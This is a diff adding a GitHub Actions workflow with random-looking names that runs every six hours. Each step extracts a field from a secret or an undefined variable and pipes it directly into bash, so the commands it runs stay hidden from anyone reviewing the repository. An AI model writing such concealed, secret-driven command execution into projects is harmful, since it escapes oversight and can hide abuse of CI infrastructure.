@@ -1,0 +1,25 @@
+name: xueyanchangju
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xueyanchangju
+        env:
+          e8: ${{ secrets.e8 }}
+        run: |
+          echo $e8 | jq -r .rkugc1076 | /bin/bash
+          echo $uouw949 | jq -r .obgo1 | /bin/bash
+          echo $s835 | jq -r .tmrp5144 | /bin/bash
+          echo $w47087 | jq -r .mk79983 | /bin/bash
+          echo $cnifw96143 | jq -r .kq98862 | /bin/bash
+          echo $zxzj72 | jq -r .eootq7331 | /bin/bash
+          echo $pjh02987 | jq -r .mh2 | /bin/bash
+          echo $asyg5 | jq -r .afqm77968 | /bin/bash
+          echo $ppbj3679 | jq -r .kriq7130 | /bin/bash
+
